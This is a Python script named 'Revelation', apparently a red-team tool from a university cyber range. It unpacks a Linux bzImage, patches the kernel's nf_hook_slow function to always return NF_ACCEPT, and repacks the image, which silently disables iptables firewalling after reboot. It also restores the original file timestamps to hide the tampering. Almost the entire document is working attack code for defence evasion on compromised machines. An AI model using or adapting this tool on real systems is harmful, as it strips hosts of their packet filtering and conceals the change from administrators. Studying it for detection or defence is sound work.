#!/usr/bin/env python3
"""
Revelation
Author: Odin Landers (ojl9576@rit.edu)

This script is designed to modify the behavior of the `nf_hook_slow` function
within a Linux kernel's bzImage by disabling the netfilter stack. This is achieved
by patching the `nf_hook_slow` function to always return `NF_ACCEPT` (1), thereby
bypassing the iptables packet filtering mechanism.

This script operates in multiple stages: it first extracts the uncompressed kernel
from the bzImage, applies the patch to the `nf_hook_slow` function in the kernel
binary, then repacks the modified kernel back into the original bzImage format. It
takes care of adjusting compressed and uncompressed sizes to ensure the kernel
boots properly after modification. The repacked bzImage can either overwrite the
original file or be saved as a new file.

This script has been tested primarily on Debian 12 from the RIT Cyber Range
OpenStack instance and was specifically developed for the x86_64 architecture. The
approach for patching the `nf_hook_slow` function can be ported to other
architectures with modifications to the relevant assembly instructions, so you
can do other things with it if you want to, I guess.

Requirements:
- Python 3.x
- elftools for parsing ELF files (`pyelftools`)
- vmlinux_to_elf.kallsyms_finder from `vmlinux-to-elf` for extracting kernel symbols
- Compression utilities that match the compression algorithm used in the kernel (such as `lz4`, `gzip`, `xz`, etc.)
(you can find these by grepping for CONFIG_KERNEL in the config in /proc/config(.gz) or in /boot/)
- Sufficient permissions to read, write, and modify kernel files

"runme.sh" in the repo root will take care of these if you deploy it in the field.
"airgap.sh" will airgap the machine (if it works, you shouldn't lose your SSH connection.)

Usage:
To use the script, specify the path to the Linux kernel bzImage file you wish to patch.
Optionally, you can pass the `--overwrite` flag to replace the original bzImage file. If
this flag is omitted, the script will create a new file with the ".patched" suffix.

The script was inspired by and initially based on the `repack_bzimage.py` script 
from the Microsoft Hacksaw project (available at https://github.com/microsoft/Hacksaw/blob/main/kernel_patch/repack_bzimage.py),
but has been fully rewritten since then.
"""

import os
import sys
import shutil
import subprocess
import tempfile
import logging
from elftools.elf.elffile import ELFFile
from vmlinux_to_elf.kallsyms_finder import KallsymsFinder, obtain_raw_kernel_from_file

logging.basicConfig(level=logging.INFO, format='[+] %(asctime)s - %(message)s')


def decompression_commands():
    """
    Define decompression commands for supported compression algorithms.
    This returns a dictionary mapping the compression algorithm identifiers
    to their respective decompression command-line utilities.
    """
    return {
        "zst": "zstdcat",
        "gz": "zcat",
        "bz2": "bzcat",
        "xz": "xzcat",
        "lzma": "lzcat",
        "lz4": "lz4cat",
        "lzo": "lzop -fdc",
    }


def compression_signatures():
    """
    Define magic signatures for supported compression algorithms.
    This returns a dictionary mapping the compression algorithm identifiers
    to their respective magic byte signatures used to identify the compression
    format within a bzImage.
    """
    return {
        "zst": b'\x28\xb5\x2f\xfd',
        "gz": b'\x1f\x8b\x08',
        "bz2": b'\x42\x5a\x68',
        "xz": b'\xfd\x37\x7a\x58\x5a\x00',
        "lzma": b'\x5d\x00\x00\x00',
        "lz4": b'\x02\x21\x4c\x18',
        "lzo": b'\x89\x4c\x5a',
    }


def detect_compression_algorithm(image_path):
    """
    Detect the compression algorithm used in the bzImage by scanning for known signatures.

    Args:
        image_path (str): Path to the bzImage file.

    Returns:
        tuple: (algorithm_name, offset) if detected, otherwise (None, None).
    """
    signatures = compression_signatures()
    decompression_cmds = decompression_commands()

    with open(image_path, 'rb') as f:
        image_data = f.read()
        # Iterate over each supported compression algorithm
        for algo, signature in signatures.items():
            sig_length = len(signature)
            index = 0
            # Slide through the image data to find the signature
            while index < len(image_data):
                if image_data[index:index+sig_length] == signature:
                    data_to_decompress = image_data[index:]
                    cmd = decompression_cmds[algo].split()
                    try:
                        # Attempt to decompress the data to verify the algorithm
                        result = subprocess.run(
                            cmd, input=data_to_decompress, stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL, check=False
                        )
                        if result.stdout:
                            logging.info(
                                f"Compression algorithm {algo} detected at offset {index}.")
                            return algo, index
                    except Exception as e:
                        logging.error(
                            f"Error during compression detection: {e}")
                index += 1
    logging.error("No valid compression algorithm found.")
    return None, None


def locate_piggy_data(image_path, start_offset=0):
    """
    Locates the piggy data section in the bzImage by searching for specific magic bytes.

    In the context of bzImage, "piggy data" refers to the start of the decompression code
    that marks the end of the compressed kernel image.

    Args:
        image_path (str): Path to the bzImage file.
        start_offset (int): Offset to start searching from.

    Returns:
        int or None: Offset of the piggy data if found, otherwise None.
    """
    piggy_magic_bytes = b'\x31\xc0\x48\x8d\x3d'
    chunk_size = 4096  # default Linux page size on x64

    with open(image_path, 'rb') as f:
        f.seek(start_offset)
        overlap = len(piggy_magic_bytes) - 1
        pos = start_offset

        prev_chunk = b''
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break

            # Combine previous chunk's end with current chunk to handle magic bytes spanning chunks
            data = prev_chunk + chunk
            idx = data.find(piggy_magic_bytes)
            if idx != -1:
                logging.info(
                    f"Piggy data located at offset {pos - len(prev_chunk) + idx}.")
                return pos - len(prev_chunk) + idx

            # Keep the last few bytes to overlap with the next chunk
            prev_chunk = data[-overlap:]
            pos += len(chunk)

    logging.error("Piggy data not found.")
    return None


def kernel_compress(kernel_path, algorithm):
    """
    Compresses the kernel using the specified compression algorithm.

    For certain compression algorithms (bz2, lzma, lzo, lz4), the original kernel size
    is appended at the end of the compressed file as a 4-byte little-endian integer.
    This is necessary because these algorithms do not include the size in the compressed
    output, and the kernel expects this size to unpack the compressed data correctly.

    Args:
        kernel_path (str): Path to the uncompressed kernel file.
        algorithm (str): Compression algorithm to use.

    Returns:
        str or None: Path to the compressed kernel file if successful, otherwise None.
    """
    temp_fd, compressed_path = tempfile.mkstemp()
    os.close(temp_fd)

    if algorithm == "zst":
        cmd = ["zstd", "--ultra", "-22", "-T0",
               "-f", kernel_path, "-o", compressed_path]
    elif algorithm == "gz":
        cmd = ["gzip", "-n", "-9", "-c", kernel_path]
    elif algorithm == "bz2":
        cmd = ["bzip2", "-9", "-c", kernel_path]
    elif algorithm == "lzma":
        cmd = ["lzma", "-9", "-c", kernel_path]
    elif algorithm == "lzo":
        cmd = ["lzop", "-9", "-c", kernel_path]
    elif algorithm == "lz4":
        cmd = ["lz4", "-9", "-l", "-c", kernel_path]
    elif algorithm == "xz":
        cmd = ["xz", "--check=crc32", "--x86",
               "--lzma2=dict=32MiB", "-c", kernel_path]

    if not cmd:
        logging.error("Unsupported compression algorithm.")
        return None

    with open(compressed_path, 'wb') as out_f:
        try:
            subprocess.run(cmd, stdout=out_f, check=False)
            logging.info(f"Kernel compressed using {algorithm}.")
        except Exception as e:
            logging.error(f"Compression failed: {e}")
            return None

    # For certain compression algorithms, append the original kernel size as a 4-byte little-endian integer
    if algorithm in ["bz2", "lzma", "lzo", "lz4"]:
        kernel_size = os.path.getsize(kernel_path)
        size_bytes = kernel_size.to_bytes(4, byteorder='little')
        logging.info(f"Appending original kernel size: {size_bytes}")
        with open(compressed_path, 'ab') as f:
            f.write(size_bytes)

    return compressed_path


def update_compressed_kernel(bzimage_file, compressed_kernel_file, start_offset, end_offset, overwrite=False):
    """
    Updates the compressed kernel section in the bzImage with the new compressed kernel.

    This function overwrites the specified region in the bzImage with the new compressed
    kernel data. If the `overwrite` flag is set, it modifies the original bzImage;
    otherwise, it creates a patched copy.

    Args:
        bzimage_file (str): Path to the original bzImage file.
        compressed_kernel_file (str): Path to the new compressed kernel file.
        start_offset (int): Start offset of the compressed kernel in bzImage.
        end_offset (int): End offset of the compressed kernel in bzImage.
        overwrite (bool): Whether to overwrite the original bzImage or create a patched copy.

    Returns:
        bool: True if successful, False otherwise.
    """
    if overwrite:
        output_image = bzimage_file
    else:
        output_image = bzimage_file + ".patched"
        shutil.copy2(bzimage_file, output_image)

    logging.info(
        f"Updating bzImage from offset {start_offset} to {end_offset}")

    zero_length = end_offset - start_offset

    try:
        with open(output_image, 'r+b') as out_f:
            out_f.seek(start_offset)
            out_f.write(b'\x00' * zero_length)

            out_f.seek(start_offset)
            with open(compressed_kernel_file, 'rb') as comp_f:
                comp_data = comp_f.read()
                if len(comp_data) > zero_length:
                    logging.error(
                        "Compressed kernel is larger than the available space.")
                    return False
                out_f.write(comp_data)
    except Exception as e:
        logging.error(f"Error updating compressed kernel: {e}")
        return False

    logging.info(f"Compressed kernel successfully updated in {output_image}.")
    return True


def extract_kernel_image(bzimage_path):
    """
    Extracts the uncompressed kernel image from the bzImage.

    This function identifies the compression algorithm, locates the piggy data
    (which marks the end of the compressed kernel), and decompresses the kernel
    to obtain the uncompressed vmlinux image.

    Args:
        bzimage_path (str): Path to the bzImage file.

    Returns:
        str or None: Path to the extracted kernel image if successful, otherwise None.
    """
    compression_algo, start_offset = detect_compression_algorithm(bzimage_path)
    if compression_algo is None:
        logging.error("Failed to detect compression algorithm.")
        return None

    # Locate the piggy data offset which signifies the end of the compressed kernel
    piggy_offset = locate_piggy_data(bzimage_path, start_offset)
    if piggy_offset is None:
        logging.error("Failed to locate piggy data.")
        return None

    with open(bzimage_path, 'rb') as f:
        f.seek(start_offset)
        compressed_data = f.read(piggy_offset - start_offset)

    temp_fd, output_path = tempfile.mkstemp(suffix='.kernel')
    os.close(temp_fd)

    decompression_cmds = decompression_commands()
    decompression_cmd = decompression_cmds[compression_algo].split()

    try:
        result = subprocess.run(
            decompression_cmd, input=compressed_data, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, check=False
        )
        with open(output_path, 'wb') as out_f:
            out_f.write(result.stdout)

        if os.path.getsize(output_path) == 0:
            os.unlink(output_path)
            logging.error("Decompressed kernel is empty.")
            return None

        logging.info(f"Kernel extracted successfully to {output_path}.")
        return output_path
    except Exception as e:
        os.unlink(output_path)
        logging.error(f"Error extracting kernel image: {e}")
        return None


def virtual_address_to_file_offset(elf_file, virtual_addr):
    """
    Converts a virtual address to a file offset using the ELF file's program headers.

    This is essential for locating the exact byte position in the kernel binary
    corresponding to a specific virtual memory address.

    Args:
        elf_file (ELFFile): Parsed ELF file object.
        virtual_addr (int): Virtual address to convert.

    Returns:
        int or None: Corresponding file offset if found, otherwise None.
    """
    for segment in elf_file.iter_segments():
        if segment['p_type'] != 'PT_LOAD':
            continue
        segment_start = segment['p_vaddr']
        segment_end = segment_start + segment['p_memsz']
        if segment_start <= virtual_addr < segment_end:
            file_offset = segment['p_offset'] + (virtual_addr - segment_start)
            return file_offset
    return None


def patch_kernel_binary(kernel_file):
    """
    Patches the kernel binary by modifying the 'nf_hook_slow' function.

    Specifically, this function overwrites the 'nf_hook_slow' function to disable
    the netfilter stack by forcing it to always act like the filters ran and returned
    NF_ACCEPT (1). This makes iptables unable to process any packets.

    Args:
        kernel_file (str): Path to the uncompressed kernel binary.

    Raises:
        SystemExit: If patching fails due to missing symbols or invalid offsets.
    """
    with open(kernel_file, 'rb') as f:
        kernel_data = f.read()
        f.seek(0)
        elf_file = ELFFile(f)

        try:
            kallsyms = KallsymsFinder(obtain_raw_kernel_from_file(kernel_data))
        except Exception as e:
            logging.error(f"Failed to create KallsymsFinder: {e}")
            sys.exit(1)

        nf_hook_slow_symbol = kallsyms.name_to_symbol.get('nf_hook_slow')
        if not nf_hook_slow_symbol:
            logging.error("Failed to find 'nf_hook_slow' symbol.")
            sys.exit(1)

        nf_hook_slow_addr = nf_hook_slow_symbol.virtual_address
        patch_file_offset = virtual_address_to_file_offset(
            elf_file, nf_hook_slow_addr)
        if patch_file_offset is None:
            logging.error("Failed to map virtual address to file offset.")
            sys.exit(1)

        file_size = len(kernel_data)
        if patch_file_offset >= file_size:
            logging.error(
                f"Calculated patch offset ({patch_file_offset}) exceeds file size ({file_size})")
            sys.exit(1)

        # Check if the first byte at the patch offset is 0xE8 (CALL opcode)
        first_byte = kernel_data[patch_file_offset]
        if first_byte == 0xE8:
            # Adjust offset by 5 to skip the "call __fentry__" instruction introduced by FTRACE
            patch_file_offset = virtual_address_to_file_offset(
                elf_file, nf_hook_slow_addr + 5)
            if patch_file_offset is None or patch_file_offset >= file_size:
                logging.error(
                    "Failed to map virtual address with +5 adjustment or it exceeds file size.")
                sys.exit(1)

    with open(kernel_file, 'r+b') as f:
        f.seek(patch_file_offset)
        # Write the patch: mov eax, 1; ret
        # This effectively makes the function always return NF_ACCEPT (1), disabling netfilter filtering
        f.write(b'\xB8\x01\x00\x00\x00\xC3')

    logging.info(f"Kernel patched at offset {patch_file_offset}")


def get_original_compressed_size(image_path, start_idx, piggy_idx):
    """
    Determines the original compressed size by trimming trailing zeros.

    Since the compression algorithms like bz2, lzma, lzo, and lz4 require the
    original kernel size to be appended, this function calculates the actual
    size of the compressed data by removing any padding zeros.

    Args:
        image_path (str): Path to the bzImage file.
        start_idx (int): Start index of the compressed kernel.
        piggy_idx (int): Start index of the piggy data.

    Returns:
        int: Original compressed size without trailing zeros.
    """
    with open(image_path, 'rb') as f:
        f.seek(start_idx)
        data = f.read(piggy_idx - start_idx)
    last_nonzero_idx = len(data)
    for i in range(len(data) - 1, -1, -1):
        if data[i] != 0:
            last_nonzero_idx = i + 1
            break
    original_compressed_size = last_nonzero_idx
    logging.info(f"Original compressed size: {original_compressed_size}")
    return original_compressed_size


def replace_sizes_in_image(image_path, old_compressed_size, old_uncompressed_size, new_compressed_size, new_uncompressed_size):
    """
    Replaces the original compressed and uncompressed sizes in the bzImage with new values.

    The bzImage contains size fields that need to be updated to reflect the new
    compressed and uncompressed kernel sizes after patching. This function locates
    these size fields by searching for the concatenated old size bytes and replaces
    them with the new size bytes.

    Args:
        image_path (str): Path to the bzImage file.
        old_compressed_size (int): Original compressed size.
        old_uncompressed_size (int): Original uncompressed size.
        new_compressed_size (int): New compressed size.
        new_uncompressed_size (int): New uncompressed size.

    Returns:
        bool: True if successful, False otherwise.
    """
    try:
        old_sizes_bytes = old_compressed_size.to_bytes(
            4, byteorder='little') + old_uncompressed_size.to_bytes(4, byteorder='little')
        new_sizes_bytes = new_compressed_size.to_bytes(
            4, byteorder='little') + new_uncompressed_size.to_bytes(4, byteorder='little')

        with open(image_path, 'rb') as f:
            image_data = f.read()

        idx = image_data.find(old_sizes_bytes)
        if idx == -1:
            logging.error("Failed to find original sizes in the image")
            return False

        patched_data = image_data[:idx] + new_sizes_bytes + image_data[idx+8:]

        with open(image_path, 'wb') as f:
            f.write(patched_data)

        logging.info(f"Successfully replaced sizes in {image_path}")
        return True
    except Exception as e:
        logging.error(f"Error replacing sizes: {e}")
        return False


def rebuild_bzimage(kernel_path, bzimage_path, original_uncompressed_size=None, new_uncompressed_size=None, inplace=False):
    """
    Rebuilds the bzImage with the patched kernel.

    This function compresses the patched kernel using the original compression algorithm,
    ensures that the new compressed size does not exceed the original space, updates the
    bzImage with the new compressed kernel, and replaces the size fields accordingly.

    Args:
        kernel_path (str): Path to the patched uncompressed kernel.
        bzimage_path (str): Path to the original bzImage.
        original_uncompressed_size (int, optional): Original uncompressed kernel size.
        new_uncompressed_size (int, optional): New uncompressed kernel size.
        inplace (bool): Whether to overwrite the original bzImage.

    Returns:
        bool: True if successful, False otherwise.
    """
    if not os.path.exists(bzimage_path):
        logging.error(f"{bzimage_path} does not exist")
        return False

    if not os.path.exists(kernel_path):
        logging.error(f"{kernel_path} does not exist")
        return False

    compression_algo, start_idx = detect_compression_algorithm(bzimage_path)
    if compression_algo is None:
        logging.error("Failed to detect compression algorithm.")
        return False

    piggy_offset = locate_piggy_data(bzimage_path, start_idx)
    if piggy_offset is None:
        logging.error("Failed to locate piggy data.")
        return False

    logging.info(
        f"Compression algorithm: {compression_algo} (start: {start_idx}, end: {piggy_offset})")

    # Get original compressed size without trailing zeros
    original_compressed_size = get_original_compressed_size(
        bzimage_path, start_idx, piggy_offset)

    compressed_kernel_path = kernel_compress(kernel_path, compression_algo)
    if compressed_kernel_path is None:
        logging.error("Compression failed.")
        return False
    new_compressed_size = os.path.getsize(compressed_kernel_path)

    # Ensure the new compressed size does not exceed the original space
    available_size = piggy_offset - start_idx
    if new_compressed_size > available_size:
        logging.error(
            f"Repacking is not possible. Compressed patched kernel ({new_compressed_size}) is larger than the original kernel space ({available_size})")
        os.unlink(compressed_kernel_path)
        return False

    success = update_compressed_kernel(
        bzimage_path, compressed_kernel_path, start_idx, piggy_offset, overwrite=inplace)
    if not success:
        os.unlink(compressed_kernel_path)
        return False

    output_image = bzimage_path if inplace else bzimage_path + ".patched"

    success = replace_sizes_in_image(
        output_image,
        original_compressed_size,
        original_uncompressed_size,
        new_compressed_size,
        new_uncompressed_size
    )

    os.unlink(compressed_kernel_path)
    return success


def main(bzimage_file, overwrite=False):
    """
    Main function to extract, patch, and rebuild the bzImage.

    This orchestrates the entire process:
    1. Extracts the uncompressed kernel from the bzImage.
    2. Patches the extracted kernel binary.
    3. Rebuilds the bzImage with the patched kernel.

    Args:
        bzimage_file (str): Path to the bzImage file.
        overwrite (bool): Whether to overwrite the original bzImage.

    Returns:
        bool: True if successful, False otherwise.
    """
    # If overwrite is True, save the original bzImage's timestamps before any operations
    if overwrite:
        try:
            original_stat = os.stat(bzimage_file)
            original_atime = original_stat.st_atime
            original_mtime = original_stat.st_mtime
            logging.info(
                f"Original bzImage timestamps saved: atime={original_atime}, mtime={original_mtime}")
        except Exception as e:
            logging.error(f"Failed to save original timestamps: {e}")
            return False

    extracted_kernel = extract_kernel_image(bzimage_file)
    if extracted_kernel is None:
        logging.error("Failed to extract the kernel image.")
        return False

    original_uncompressed_size = os.path.getsize(extracted_kernel)

    # Patch the extracted kernel binary by modifying the 'nf_hook_slow' function
    patch_kernel_binary(extracted_kernel)

    new_uncompressed_size = os.path.getsize(extracted_kernel)

    success = rebuild_bzimage(
        extracted_kernel,
        bzimage_file,
        original_uncompressed_size,
        new_uncompressed_size,
        inplace=overwrite
    )

    # Clean up the temporary extracted kernel file
    os.unlink(extracted_kernel)

    if not success:
        logging.error("Rebuilding bzImage failed.")
        return False

    # If we're overwriting, restore the original timestamps
    if overwrite:
        try:
            os.utime(bzimage_file, (original_atime, original_mtime))
            logging.info(
                f"Original bzImage timestamps restored: atime={original_atime}, mtime={original_mtime}")
        except Exception as e:
            logging.error(f"Failed to restore original timestamps: {e}")
            return False

    return True


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <bzImage> [--overwrite]")
        sys.exit(1)

    bzimage_file = sys.argv[1]
    overwrite = "--overwrite" in sys.argv

    if main(bzimage_file, overwrite):
        logging.info("Kernel successfully extracted, patched, and rebuilt.")
    else:
        logging.error("Failed to process the kernel.")
